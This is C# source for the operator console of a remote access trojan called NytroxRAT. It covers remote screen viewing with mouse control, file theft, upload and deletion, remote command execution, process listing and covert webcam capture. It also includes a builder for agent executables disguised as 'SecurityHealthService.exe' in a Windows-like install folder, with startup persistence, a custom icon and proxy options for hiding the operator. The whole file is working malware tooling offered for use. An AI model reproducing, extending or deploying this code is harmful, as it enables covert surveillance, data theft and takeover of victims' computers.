using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using NytroxRAT.Shared.Models;
using Ookii.Dialogs.Wpf;

namespace NytroxRAT.Client;

public partial class MainWindow : Window
{
    private readonly ClientListener  _listener   = new();
    private int                      _listenPort = 9000;
    private AgentSession?            _active;
    private CancellationTokenSource? _streamCts;
    private volatile bool            _frameInFlight;
    private readonly List<AgentSession> _agentSessions = new();
    private readonly StringBuilder   _log = new();

    public MainWindow()
    {
        InitializeComponent();
        _listener.AgentConnected    += s => Dispatcher.Invoke(() => OnConnected(s));
        _listener.AgentDisconnected += s => Dispatcher.Invoke(() => OnDisconnected(s));
        _listener.PacketReceived    += (s, p) => Dispatcher.InvokeAsync(() => OnPacket(s, p));
    }

    // ── Listen ─────────────────────────────────────────────────────────────
    private void BtnConnect_Click(object sender, RoutedEventArgs e)
    {
        if (!int.TryParse(TxtPort.Text, out _listenPort)) _listenPort = 9000;
        var myIp = TxtMyIp.Text.Trim();
        try
        {
            var useWss     = ChkWss.IsChecked == true;
            var urls       = _listener.StartListening(_listenPort, TxtSecret.Text, useWss);
            var scheme     = useWss ? "wss" : "ws";
            var displayUrl = string.IsNullOrWhiteSpace(myIp) || myIp == "0.0.0.0"
                ? string.Join("  |  ", urls) : $"{scheme}://{myIp}:{_listenPort}";

            StatusLabel.Text        = $"[ LISTENING : {_listenPort} ]";
            StatusDot.Fill          = Brush(180, 80, 0);
            BtnConnect.IsEnabled    = false;
            BtnDisconnect.IsEnabled = true;
            ListenAddresses.Text    = displayUrl;
            ListenPanel.Visibility  = Visibility.Visible;
            BuilderIp.Text          = myIp == "0.0.0.0" || string.IsNullOrWhiteSpace(myIp)
                ? urls.FirstOrDefault()?.Replace("wss://","").Replace("ws://","").Split(':')[0] ?? "" : myIp;
            BuilderPort.Text        = _listenPort.ToString();
            BuilderSecret.Text      = TxtSecret.Text;
            Log($"[LISTEN] {displayUrl}");
        }
        catch (Exception ex) { MessageBox.Show($"Failed:\n{ex.Message}", "Error"); }
    }

    private void BtnDisconnect_Click(object sender, RoutedEventArgs e)
    {
        _streamCts?.Cancel();
        _listener.StopListening();
        _agentSessions.Clear();
        _active = null;
        RebuildList();
        StatusDot.Fill          = Brush(51, 0, 0);
        StatusLabel.Text        = "[ OFFLINE ]";
        AgentCountLabel.Text    = "";
        BtnConnect.IsEnabled    = true;
        BtnDisconnect.IsEnabled = false;
        ListenPanel.Visibility  = Visibility.Collapsed;
        Log("[STOP] Listener stopped.");
    }

    private void DisconnectAgent_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        try { _active.MWS?.CloseAsync(); _active._wsOpen = false; } catch { }
    }

    // ── Agent events ───────────────────────────────────────────────────────
    private void OnConnected(AgentSession s)
    {
        _agentSessions.Add(s);
        RebuildList();
        StatusDot.Fill         = Brush(200, 20, 20);
        StatusLabel.Text       = $"[ CONNECTED : {_agentSessions.Count} ]";
        ListenPanel.Visibility = Visibility.Collapsed;
        if (_active == null) SelectAgent(s);
        Log($"[CONNECT] {s.IpAddress} — {s.Id}");
    }

    private void OnDisconnected(AgentSession s)
    {
        _agentSessions.Remove(s);
        if (_active?.Id == s.Id) { _streamCts?.Cancel(); _frameInFlight = false; _active = null; }
        RebuildList();
        if (_active == null && _agentSessions.Count > 0) SelectAgent(_agentSessions[0]);
        Log($"[DISCONNECT] {s.DisplayName}");
    }

    private void RebuildList()
    {
        AgentList.ItemsSource = null;
        AgentList.ItemsSource = _agentSessions;
        AgentCountLabel.Text  = _agentSessions.Count > 0
            ? $"[ {_agentSessions.Count} AGENT{(_agentSessions.Count != 1 ? "S" : "")} ]" : "";
        if (_agentSessions.Count == 0)
        {
            StatusDot.Fill         = Brush(180, 80, 0);
            StatusLabel.Text       = $"[ LISTENING : {_listenPort} ]";
            ListenPanel.Visibility = Visibility.Visible;
        }
        if (_active != null) AgentList.SelectedItem = _active;
    }

    private void SelectAgent(AgentSession s)
    {
        _active                = s;
        AgentList.SelectedItem = s;
    }

    private void AgentList_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (AgentList.SelectedItem is AgentSession s && s.Id != _active?.Id)
        {
            _active = s;
            Log($"[SELECTED] {s.DisplayName}");
        }
    }

    // ── Packets ────────────────────────────────────────────────────────────
    private void OnPacket(AgentSession session, Packet pkt)
    {
        // Always handle stats for hostname update
        if (pkt.Type == PacketType.SystemStats)
        {
            try
            {
                var st = JsonSerializer.Deserialize<SystemStatsPayload>(pkt.Payload);
                if (st != null) { session.Hostname = st.Hostname; session.OsVersion = st.OsVersion; }
            }
            catch { }
            RebuildList();
        }

        if (session.Id != _active?.Id) return;

        switch (pkt.Type)
        {
            case PacketType.ScreenFrame:
                _frameInFlight = false;
                try { var f = J<ScreenFramePayload>(pkt); if (f != null) Frame(f.ImageBase64); } catch { }
                break;
            case PacketType.FileListResponse:
                try { var r = J<FileListResponse>(pkt); if (r != null) ShowFiles(r); } catch { }
                break;
            case PacketType.FileDownloadResponse:
                try { var r = J<FileDownloadResponse>(pkt); if (r != null) SaveFile(r); } catch { }
                break;
            case PacketType.FileUploadResponse:
                try { var r = J<FileUploadResponse>(pkt); if (r != null) FileStatus.Text = r.Success ? "✓ UPLOAD OK" : $"FAILED: {r.Error}"; } catch { }
                break;
            case PacketType.FileDeleteResponse:
                try
                {
                    var r = J<FileDeleteResponse>(pkt);
                    if (r != null) { FileStatus.Text = r.Success ? "✓ DELETED" : $"FAILED: {r.Error}"; if (r.Success) FilesGo_Click(null!, null!); }
                }
                catch { }
                break;
            case PacketType.CommandOutput:
                try
                {
                    var r = J<CommandOutputPayload>(pkt);
                    if (r != null && !r.IsFinished) { TerminalOutput.AppendText((r.IsError ? "[ERR] " : "") + r.Output + "\n"); TerminalOutput.ScrollToEnd(); }
                }
                catch { }
                break;
            case PacketType.SystemStats:
                try { var st = J<SystemStatsPayload>(pkt); if (st != null) ShowStats(st); } catch { }
                break;
            case PacketType.ProcessList:
                try { var pl = J<List<ProcessEntry>>(pkt); if (pl != null) ShowProcs(pl); } catch { }
                break;

            case PacketType.WebcamListResponse:
                try
                {
                    var wl = J<WebcamListResponse>(pkt);
                    if (wl != null)
                    {
                        CamDeviceCombo.ItemsSource   = wl.Devices;
                        CamDeviceCombo.SelectedIndex = wl.Devices.Count > 0 ? 0 : -1;
                        CamStatus.Text = wl.Devices.Count > 0
                            ? $"{wl.Devices.Count} CAMERA{(wl.Devices.Count != 1 ? "S" : "")} FOUND"
                            : "NO CAMERAS DETECTED";
                    }
                }
                catch { }
                break;

            case PacketType.WebcamFrame:
                try
                {
                    var wf = J<WebcamFramePayload>(pkt);
                    if (wf != null && !string.IsNullOrEmpty(wf.ImageBase64))
                    {
                        var bi = new BitmapImage();
                        bi.BeginInit();
                        bi.StreamSource  = new MemoryStream(Convert.FromBase64String(wf.ImageBase64));
                        bi.CacheOption   = BitmapCacheOption.OnLoad;
                        bi.CreateOptions = BitmapCreateOptions.None;
                        bi.EndInit(); bi.Freeze();
                        CamImage.Source = bi;
                        CamStatus.Text  = $"LIVE — {wf.Width}x{wf.Height}";
                    }
                }
                catch { }
                break;
        }
    }

    private T? J<T>(Packet p) { try { return JsonSerializer.Deserialize<T>(p.Payload); } catch { return default; } }

    private Task Send(PacketType t, object? payload = null)
    {
        if (_active == null) return Task.CompletedTask;
        return _listener.SendAsync(_active, new Packet
        {
            Type    = t,
            Payload = payload is string s ? s : payload != null ? JsonSerializer.Serialize(payload) : ""
        });
    }

    // ── Screen ─────────────────────────────────────────────────────────────
    private void StartStream_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        var fpsStr  = (FpsCombo.SelectedItem as ComboBoxItem)?.Content?.ToString() ?? "15";
        var fps     = int.TryParse(fpsStr, out var fp) ? fp : 15;
        var sess    = _active;
        _streamCts?.Cancel();
        _streamCts  = new CancellationTokenSource();
        var ct      = _streamCts.Token;
        var ms      = 1000.0 / fps;
        Task.Run(async () =>
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();
            while (!ct.IsCancellationRequested)
            {
                var t0 = sw.Elapsed.TotalMilliseconds;
                if (!_frameInFlight && sess.IsActive)
                {
                    _frameInFlight = true;
                    try { await _listener.SendAsync(sess, new Packet { Type = PacketType.ScreenRequest }); }
                    catch { _frameInFlight = false; }
                }
                var wait = (int)Math.Max(1, ms - (sw.Elapsed.TotalMilliseconds - t0));
                try { await Task.Delay(wait, ct); } catch (OperationCanceledException) { break; }
            }
        }, ct);
        Log($"[SCREEN] Stream @ {fps} FPS");
    }

    private void StopStream_Click(object sender, RoutedEventArgs e) { _streamCts?.Cancel(); _frameInFlight = false; }

    private void Frame(string b64)
    {
        try
        {
            var bi = new BitmapImage();
            bi.BeginInit();
            bi.StreamSource  = new MemoryStream(Convert.FromBase64String(b64));
            bi.CacheOption   = BitmapCacheOption.OnLoad;
            bi.CreateOptions = BitmapCreateOptions.None;
            bi.EndInit(); bi.Freeze();
            ScreenImage.Source = bi;
        }
        catch { _frameInFlight = false; }
    }

    private void QualitySlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
    { if (QualityLabel != null) QualityLabel.Text = $"{(int)e.NewValue}%"; }

    private async void ScreenImage_MouseMove(object s, System.Windows.Input.MouseEventArgs e)
    {
        if (_active == null || ChkSendInput.IsChecked != true) return;
        var p = Scale(e.GetPosition(ScreenImage));
        await Send(PacketType.MouseMove, new MouseMovePayload { X = p.x, Y = p.y });
    }
    private async void ScreenImage_MouseDown(object s, MouseButtonEventArgs e) => await Click(e, true);
    private async void ScreenImage_MouseUp  (object s, MouseButtonEventArgs e) => await Click(e, false);
    private async Task Click(MouseButtonEventArgs e, bool dn)
    {
        if (_active == null || ChkSendInput.IsChecked != true) return;
        var p = Scale(e.GetPosition(ScreenImage));
        int b = e.ChangedButton == MouseButton.Left ? 0 : e.ChangedButton == MouseButton.Right ? 1 : 2;
        await Send(PacketType.MouseClick, new MouseClickPayload { X = p.x, Y = p.y, Button = b, IsDown = dn });
    }
    private (int x, int y) Scale(System.Windows.Point pt)
    {
        if (ScreenImage.Source is not BitmapSource src) return (0, 0);
        return ((int)(pt.X * src.PixelWidth / ScreenImage.ActualWidth),
                (int)(pt.Y * src.PixelHeight / ScreenImage.ActualHeight));
    }

    // ── Files ──────────────────────────────────────────────────────────────
    private async void FilesGo_Click(object sender, RoutedEventArgs e)
    { if (_active != null) { FileStatus.Text = "LOADING..."; await Send(PacketType.FileListRequest, new FileListRequest { Path = TxtFilePath.Text }); } }

    private void TxtFilePath_KeyDown(object sender, System.Windows.Input.KeyEventArgs e) { if (e.Key == Key.Enter) FilesGo_Click(sender, e); }

    private async void FilesUp_Click(object sender, RoutedEventArgs e)
    {
        var p = Path.GetDirectoryName(TxtFilePath.Text.TrimEnd('\\'));
        if (!string.IsNullOrEmpty(p)) { TxtFilePath.Text = p; await Send(PacketType.FileListRequest, new FileListRequest { Path = p }); }
    }

    private async void FileList_DoubleClick(object sender, MouseButtonEventArgs e)
    {
        if (FileList.SelectedItem is not FileViewModel vm || !vm.Entry.IsDirectory) return;
        TxtFilePath.Text = vm.Entry.FullPath;
        await Send(PacketType.FileListRequest, new FileListRequest { Path = vm.Entry.FullPath });
    }

    private void ShowFiles(FileListResponse r)
    {
        if (r.Error != null) { FileStatus.Text = $"ERROR: {r.Error}"; return; }
        TxtFilePath.Text     = r.Path;
        FileStatus.Text      = $"{r.Entries.Count} ITEMS";
        FileList.ItemsSource = r.Entries.Select(e => new FileViewModel(e)).ToList();
    }

    private async void FileDownload_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null || FileList.SelectedItem is not FileViewModel vm) return;
        FileStatus.Text = $"DOWNLOADING {vm.Entry.Name}...";
        await Send(PacketType.FileDownloadRequest, new FileDownloadRequest { Path = vm.Entry.FullPath });
    }

    private async void FileUpload_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        var dlg = new OpenFileDialog();
        if (dlg.ShowDialog() != true) return;
        var dest = Path.Combine(TxtFilePath.Text, Path.GetFileName(dlg.FileName));
        FileStatus.Text = $"UPLOADING {Path.GetFileName(dlg.FileName)}...";
        await Send(PacketType.FileUploadRequest, new FileUploadRequest { DestinationPath = dest, DataBase64 = Convert.ToBase64String(await File.ReadAllBytesAsync(dlg.FileName)) });
    }

    private async void FileDelete_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null || FileList.SelectedItem is not FileViewModel vm) return;
        if (MessageBox.Show($"Delete {vm.Entry.Name}?", "Confirm", MessageBoxButton.YesNo) != MessageBoxResult.Yes) return;
        await Send(PacketType.FileDeleteRequest, new FileDeleteRequest { Path = vm.Entry.FullPath });
    }

    private void SaveFile(FileDownloadResponse r)
    {
        if (r.Error != null) { FileStatus.Text = $"FAILED: {r.Error}"; return; }
        if (string.IsNullOrEmpty(r.DataBase64)) { FileStatus.Text = "FAILED: empty data"; return; }
        var dlg = new SaveFileDialog { FileName = Path.GetFileName(r.Path) };
        if (dlg.ShowDialog() != true) return;
        try
        {
            File.WriteAllBytes(dlg.FileName, Convert.FromBase64String(r.DataBase64));
            FileStatus.Text = $"✓ SAVED: {dlg.FileName}";
        }
        catch (Exception ex) { FileStatus.Text = $"FAILED: {ex.Message}"; }
    }

    // ── Terminal ───────────────────────────────────────────────────────────
    private async void RunCommand_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null || string.IsNullOrWhiteSpace(TxtCommand.Text)) return;
        var cmd = TxtCommand.Text.Trim();
        TerminalOutput.AppendText($"\n[{_active.Hostname}] > {cmd}\n");
        TerminalOutput.ScrollToEnd();
        TxtCommand.Clear();
        await Send(PacketType.CommandExecute, new CommandExecutePayload { Command = cmd });
    }
    private void TxtCommand_KeyDown(object sender, System.Windows.Input.KeyEventArgs e) { if (e.Key == Key.Enter) RunCommand_Click(sender, e); }
    private void ClearTerminal_Click(object sender, RoutedEventArgs e) => TerminalOutput.Clear();

    // ── Monitor ────────────────────────────────────────────────────────────
    private void ShowStats(SystemStatsPayload s)
    {
        LblCpu.Text    = s.CpuPercent > 0 ? $"{s.CpuPercent:F1}%" : "—";
        LblMem.Text    = $"{s.MemoryUsedBytes/1024/1024} / {s.MemoryTotalBytes/1024/1024} MB";
        LblHost.Text   = s.Hostname;
        LblUptime.Text = $"{(int)s.Uptime.TotalHours}h {s.Uptime.Minutes}m";
        DiskPanel.Children.Clear();
        foreach (var d in s.Disks)
        {
            var used = d.TotalBytes - d.FreeBytes;
            var pct  = d.TotalBytes > 0 ? (double)used / d.TotalBytes * 100 : 0;
            var card = new Border { Background = Brush(10,0,0), BorderBrush = Brush(42,0,0), BorderThickness = new Thickness(1), CornerRadius = new CornerRadius(2), Margin = new Thickness(4), Padding = new Thickness(12), Width = 160 };
            var sp   = new StackPanel();
            sp.Children.Add(new TextBlock { Text = d.Name, Foreground = new SolidColorBrush(Colors.White), FontWeight = FontWeights.Bold, FontFamily = new FontFamily("Consolas") });
            sp.Children.Add(new TextBlock { Text = $"{used/1024/1024/1024:F1} / {d.TotalBytes/1024/1024/1024:F1} GB", Foreground = Brush(136,68,68), FontSize = 11, FontFamily = new FontFamily("Consolas") });
            var tr = new Border { Background = Brush(30,0,0), CornerRadius = new CornerRadius(2), Height = 5, Margin = new Thickness(0,5,0,0) };
            tr.Child = new Border { Background = Brush(180,20,20), CornerRadius = new CornerRadius(2), Height = 5, HorizontalAlignment = HorizontalAlignment.Left, Width = Math.Max(1, 136*pct/100) };
            sp.Children.Add(tr); card.Child = sp; DiskPanel.Children.Add(card);
        }
    }

    private async void RefreshProcesses_Click(object sender, RoutedEventArgs e) => await Send(PacketType.ProcessList, "{}");
    private void ShowProcs(List<ProcessEntry> p) => ProcessListView.ItemsSource = p.Select(x => new ProcessViewModel(x)).ToList();

    // ── Webcam ─────────────────────────────────────────────────────────────
    private async void CamRefresh_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        CamStatus.Text = "SCANNING FOR CAMERAS...";
        await Send(PacketType.WebcamListRequest, "{}");
    }

    private async void StartCam_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        var dev = CamDeviceCombo.SelectedItem as WebcamDevice;
        if (dev == null) { CamStatus.Text = "NO CAMERA SELECTED — click REFRESH first"; return; }
        CamStatus.Text = $"CONNECTING TO: {dev.Name}...";
        await Send(PacketType.WebcamRequest, new WebcamRequestPayload { CameraIndex = dev.Index });
        Log($"[WEBCAM] Started {dev.Name} (index {dev.Index}) on {_active.DisplayName}");
    }

    private async void StopCam_Click(object sender, RoutedEventArgs e)
    {
        if (_active == null) return;
        await Send(PacketType.WebcamStop, "{}");
        CamStatus.Text  = "STOPPED";
        CamImage.Source = null;
        Log($"[WEBCAM] Stopped on {_active.DisplayName}");
    }

    private void CamSnapshot_Click(object sender, RoutedEventArgs e)
    {
        if (CamImage.Source is not BitmapSource src) return;
        var dlg = new SaveFileDialog
        {
            Filter   = "PNG Image|*.png",
            FileName = $"webcam_{DateTime.Now:yyyyMMdd_HHmmss}.png"
        };
        if (dlg.ShowDialog() != true) return;
        var enc = new PngBitmapEncoder();
        enc.Frames.Add(BitmapFrame.Create(src));
        using var fs = File.OpenWrite(dlg.FileName);
        enc.Save(fs);
        CamStatus.Text = $"✓ SAVED: {dlg.FileName}";
        Log($"[WEBCAM] Snapshot saved: {dlg.FileName}");
    }

    // ── Tab auto-load ──────────────────────────────────────────────────────
    private void MainTabs_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (e.Source is not TabControl || _active == null) return;
        var h = (MainTabs.SelectedItem as TabItem)?.Header?.ToString() ?? "";
        if (h.Contains("FILES"))   _ = Send(PacketType.FileListRequest, new FileListRequest { Path = TxtFilePath.Text });
        if (h.Contains("MONITOR")) _ = Send(PacketType.ProcessList, "{}");
        if (h.Contains("WEBCAM"))  _ = Send(PacketType.WebcamListRequest, "{}");
    }

    // ── Audit log ──────────────────────────────────────────────────────────
    private void Log(string msg)
    {
        var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n";
        _log.Append(line);
        if (Dispatcher.CheckAccess()) { AuditLog.AppendText(line); AuditLog.ScrollToEnd(); }
        else Dispatcher.Invoke(() => { AuditLog.AppendText(line); AuditLog.ScrollToEnd(); });
    }
    private void ExportLog_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new SaveFileDialog { Filter = "Text|*.txt", FileName = $"NytroxRAT_Log_{DateTime.Now:yyyyMMdd_HHmmss}.txt" };
        if (dlg.ShowDialog() == true) File.WriteAllText(dlg.FileName, _log.ToString());
    }
    private void ClearLog_Click(object sender, RoutedEventArgs e) { AuditLog.Clear(); _log.Clear(); }

    // ── Builder ────────────────────────────────────────────────────────────
    private void Window_Loaded(object sender, RoutedEventArgs e) => Log("[STARTUP] NytroxRAT Admin Console ready.");

    private void BuilderBrowseOutput_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new VistaFolderBrowserDialog
        {
            Description = "Select folder for the generated agent EXE",
            UseDescriptionForTitle = true
        };
        if (dlg.ShowDialog() == true && !string.IsNullOrEmpty(dlg.SelectedPath))
            BuilderOutputPath.Text = dlg.SelectedPath;
    }

    private void BuilderBrowseIcon_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "Icon files (*.ico)|*.ico|All files (*.*)|*.*",
            Title  = "Select custom icon for the agent"
        };
        if (dlg.ShowDialog() == true)
            BuilderIconPath.Text = dlg.FileName;
    }

    private void BtnBuild_Click(object sender, RoutedEventArgs e)
    {
        if (string.IsNullOrWhiteSpace(BuilderIp.Text))     { BuildResult(false, "Enter your IP.");     return; }
        if (string.IsNullOrWhiteSpace(BuilderPort.Text))   { BuildResult(false, "Enter the port.");    return; }
        if (string.IsNullOrWhiteSpace(BuilderSecret.Text)) { BuildResult(false, "Enter the secret.");  return; }
        if (string.IsNullOrWhiteSpace(BuilderOutputPath.Text) || BuilderOutputPath.Text.StartsWith("("))
            { BuildResult(false, "Choose an output folder."); return; }
        var outDir = BuilderOutputPath.Text.Trim();
        if (!Directory.Exists(outDir)) { BuildResult(false, "Output folder does not exist."); return; }

        var exeName = BuilderExeName.Text.Trim();
        if (string.IsNullOrWhiteSpace(exeName)) exeName = "SecurityHealthService.exe";
        if (!exeName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) exeName += ".exe";

        var output = Path.Combine(outDir, exeName);
        var iconRaw = BuilderIconPath.Text.Trim();
        if (iconRaw.StartsWith("(")) iconRaw = "";
        string? iconPath = string.IsNullOrWhiteSpace(iconRaw) || !File.Exists(iconRaw) ? null : iconRaw;

        if (string.IsNullOrWhiteSpace(BuilderInstallFolder.Text.Trim()))
            { BuildResult(false, "Set an install subfolder (e.g. Microsoft\\Windows\\SecurityHealth)."); return; }
        if (string.IsNullOrWhiteSpace(BuilderPersistenceKey.Text.Trim()))
            { BuildResult(false, "Set a startup key name (registry / scheduled task)."); return; }

        BtnBuild.IsEnabled = false;
        BtnBuild.Content   = "[ BUILDING... ~30s ]";
        var ip        = BuilderIp.Text.Trim();
        var port      = BuilderPort.Text.Trim();
        var secret    = BuilderSecret.Text;
        var proxyHost = BuilderProxyHost.Text.Trim();
        var proxyPort = BuilderProxyPort.Text.Trim();
        var hideIp    = BuilderHideIp.IsChecked == true;
        var useWss    = ChkWss.IsChecked == true;
        var installFolder = BuilderInstallFolder.Text.Trim();
        var persistenceKey = BuilderPersistenceKey.Text.Trim();
        Log($"[BUILD] Compiling → {(useWss?"wss":"ws")}://{ip}:{port}" + (string.IsNullOrEmpty(proxyHost) ? "" : $" via {proxyHost}:{proxyPort}"));
        Task.Run(() =>
        {
            var r = AgentBuilder.Build(ip, port, secret, output, proxyHost, proxyPort, hideIp, useWss,
                installFolder, persistenceKey, iconPath);
            Dispatcher.Invoke(() =>
            {
                BuildResult(r.Success, r.Message);
                Log(r.Success ? $"[BUILD] Done → {output} ({r.OutputSize/1024} KB)" : $"[BUILD] FAILED");
                BtnBuild.IsEnabled = true;
                BtnBuild.Content   = "[ GENERATE AGENT PACKAGE ]";
            });
        });
    }

    private void BuildResult(bool ok, string msg)
    {
        BuildResultBorder.Visibility = Visibility.Visible;
        BuildResultBorder.Background = ok ? Brush(13,42,30) : Brush(42,13,13);
        BuildResultIcon.Text         = ok ? "✅ Success" : "❌ Error";
        BuildResultIcon.Foreground   = ok ? Brush(29,209,161) : Brush(255,91,91);
        BuildResultText.Text         = msg;
    }

    // ── Helper ─────────────────────────────────────────────────────────────
    private static SolidColorBrush Brush(byte r, byte g, byte b) => new(Color.FromRgb(r, g, b));
}

public class FileViewModel(FileEntry e)
{
    public FileEntry Entry        => e;
    public string    Name         => e.Name;
    public string    TypeLabel    => e.IsDirectory ? "📁 Folder" : "📄 File";
    public string    SizeLabel    => e.IsDirectory ? "" : Fmt(e.Size);
    public string    LastModified => e.LastModified.ToString("yyyy-MM-dd HH:mm");
    static string Fmt(long b) => b switch { < 1024 => $"{b} B", < 1_048_576 => $"{b/1024} KB", < 1_073_741_824 => $"{b/1_048_576} MB", _ => $"{b/1_073_741_824:F1} GB" };
}
public class ProcessViewModel(ProcessEntry p)
{
    public int    Pid      => p.Pid;
    public string Name     => p.Name;
    public string MemLabel => $"{p.MemoryBytes/1024/1024} MB";
}
